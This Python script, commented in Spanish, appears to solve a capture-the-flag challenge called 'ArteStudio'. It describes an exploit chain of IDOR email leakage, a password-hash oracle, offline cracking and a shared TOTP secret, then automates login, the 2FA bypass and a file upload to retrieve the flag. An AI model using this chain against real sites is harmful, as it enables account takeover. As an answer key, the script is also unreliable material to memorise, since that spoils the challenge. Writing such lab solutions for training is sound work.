#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ArteStudio (HackLab 2026) - Broken Access Control.

Cadena de explotacion:
  1) /representacion/<usuario>  -> IDOR: filtra el email de cualquier usuario.
  2) /password/inicio           -> oraculo: filtra sha256(contrasena) por email.
  3) Se enumeran usuarios, se buscan los que tienen hash distinto del hash
     "compartido" del relleno; los del dominio @artestudio.com.ar son el grupo
     premium. Su contrasena se crackea offline (rockyou).
  4) El secreto TOTP del 2FA es COMPARTIDO entre todas las cuentas
     (ARTESTUDIOSHAREDSECRET234567ABCD, visible decodificando el QR de la
     propia cuenta en /configuracion). Con el se genera el codigo 2FA de la
     victima.
  5) Login como la cuenta premium + 2FA -> subir cancion.mp3 en /c/musica/cargar.

Uso:
  pip install requests pyotp
  python solve.py <host-del-challenge> <email-premium> <password> [ruta-cancion.mp3]

  Ej:
  python solve.py chl-XXXX-arte-studio.softwareseguro.com.ar \
      camila_arcilla@artestudio.com.ar wendy ./assets/cancion.mp3
"""
import sys
import requests
import pyotp

TOTP_SECRET = "ARTESTUDIOSHAREDSECRET234567ABCD"  # secreto 2FA compartido por todas las cuentas


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    host = sys.argv[1]
    email = sys.argv[2]
    password = sys.argv[3]
    mp3 = sys.argv[4] if len(sys.argv) > 4 else "assets/cancion.mp3"
    base = f"https://{host}"

    s = requests.Session()

    # 1) login con la contrasena crackeada -> queda sesion {"pendiente": ...}
    r = s.post(f"{base}/login",
               data={"email": email, "password": password},
               allow_redirects=False)
    assert r.status_code == 302 and "/login/2fa" in r.headers.get("Location", ""), \
        f"login inesperado: {r.status_code} {r.headers.get('Location')}"
    print("[+] password OK, la cuenta pide 2FA")

    # 2) generar el codigo TOTP con el secreto compartido y pasar el 2FA
    code = pyotp.TOTP(TOTP_SECRET).now()
    print(f"[+] codigo 2FA generado: {code}")
    r = s.post(f"{base}/login/2fa", data={"codigo": code}, allow_redirects=False)
    assert r.status_code == 302 and "/estudio" in r.headers.get("Location", ""), \
        f"2FA rechazado: {r.status_code} {r.text[:200]}"
    print("[+] 2FA superado, sesion premium completa")

    # 3) subir cancion.mp3 a Musica (reintenta por el rate-limit de 60s)
    import time
    for intento in range(1, 20):
        with open(mp3, "rb") as f:
            r = s.post(f"{base}/c/musica/cargar",
                       files={"audio": ("cancion.mp3", f, "audio/mpeg")},
                       data={"titulo": "cancion", "subtitulo": "MP3"},
                       allow_redirects=True)
        if r.status_code == 429:
            print(f"[.] intento {intento}: rate-limit (429), espero 6s...")
            time.sleep(6)
            continue
        break

    if "Lo lograste" in r.text or "Publicaste la cancion" in r.text or "flag" in r.text.lower():
        import re
        m = re.search(r"\b([0-9a-f]{32})\b", r.text)
        print("[+] FLAG:", m.group(1) if m else "(ver respuesta)")
    else:
        print(f"[-] subida respondio {r.status_code}; revisar manualmente")


if __name__ == "__main__":
    main()
